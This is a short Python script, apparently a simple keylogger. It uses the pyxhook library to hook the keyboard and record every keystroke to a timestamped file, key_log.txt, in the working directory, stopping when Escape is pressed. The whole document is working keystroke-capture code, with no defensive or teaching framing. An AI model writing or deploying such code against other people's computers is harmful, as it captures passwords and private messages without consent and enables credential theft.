import pyxhook,os,time

cwd = os.getcwd()
date = time.strftime("%x") + " " + time.strftime("%X")

log_file = cwd + "/key_log.txt"

f = open(log_file, "a")
f.write("\n" + date + "\n")
f.close()


def OnKeyPress(event):

    f = open(log_file, "a")

    if event.Key == "Escape":
        f.close()
        new_hook.cancel()
    elif event.Key == "Return":
        f.write("\n")
    elif event.Key == "space":
        f.write(" ")
    elif "Shift_" in event.Key:
        f.write("")
    else:
        f.write(event.Key)


# instantiate HookManager class
new_hook=pyxhook.HookManager()
# listen to all keystrokes
new_hook.KeyDown=OnKeyPress
# hook the keyboard
new_hook.HookKeyboard()
# start the session
new_hook.start()